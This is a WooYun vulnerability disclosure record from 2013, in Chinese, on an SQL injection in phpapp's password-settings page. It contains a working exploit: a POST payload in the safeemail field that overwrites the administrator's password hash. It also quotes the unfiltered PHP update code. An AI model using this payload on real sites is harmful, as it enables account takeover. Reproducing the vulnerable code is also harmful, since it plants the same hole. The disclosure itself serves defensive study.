{"id": 59502, "wybug_id": "wooyun-2013-047101", "wybug_title": "phpapp注入1（任意用户登陆）", "wybug_corp": "phpapp", "wybug_author": "句子", "wybug_date": "2013-12-26 18:30", "wybug_open_date": "2014-03-26 18:31", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-03-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： phpapp注入1，注入可修改管理员密码~ 详细说明：  测试的20131210发布的gbk版本未对post传入的safeemail作过滤，在gpc关闭的情况下可以直接update型注入，在gpc开启的情况，宽字符注入；漏洞exp：http://200.200.87.150:911/member.php?app=2&member=&action=43Post的参数：PasswordOld=admin123&PasswordNew=admin123&Password=admin123&safeemail_s=hingzi%40163.com&Submit=%E4%BF%9D%E5%AD%98%E8%AE%BE%E7%BD%AE&safeemail=1232@123.com',`password`='1c13dd448385e0aa32342888a8ae5528' where uid='1'--%20文件： E:\\PHPAPP_GBK\\upload\\phpapp\\apps\\member\\member_phpapp.php\npublic function SetPasswordAction(){\t\t\t       $member=$this->GetMysqlOne('*',\" \".$this->GetTable('member').\" WHERE  uid='$this->uid'\");\t   \t\t   \t\t   if($this->POST['Submit']){\t   \t\t   \t\t\t\t\tinclude_once(APPS.'/member/main_phpapp.php');\t\t\t\t\t\t\t\t\t\t$checkpassword = new SubmitRegister($this->POST);\t\t         \t\t            $result=$checkpassword->EditPassword($this->uid,$this->POST,1);\t\t\t\t\t\t\t\t\t\tif($result=='ok'){\t\t\t\t\t\t#echo $this->POST['safeemail'];exit;\t\t\t\t\t\t $this->Update('member',array('safeemail'=>$this->POST['safeemail']),array(),\" WHERE uid='$this->uid'\");\t\t\t\t\t\t\t\t\t\t\t\t echo '设置成功!<br />';\t\t\t\t\t\t \t\t\t\t\t}else{\t\t\t\t\t\t echo $result;\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t   \t\t   \t\t            echo $this->CloseNowWindows('#loading',1);\t\t\t   \t\t   }else{\t\t          include $this->Template('password_member');\t\t   }\t}\n   漏洞证明：  见详细说明   修复方案：  传入过滤字符   版权声明：转载请注明来源 句子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}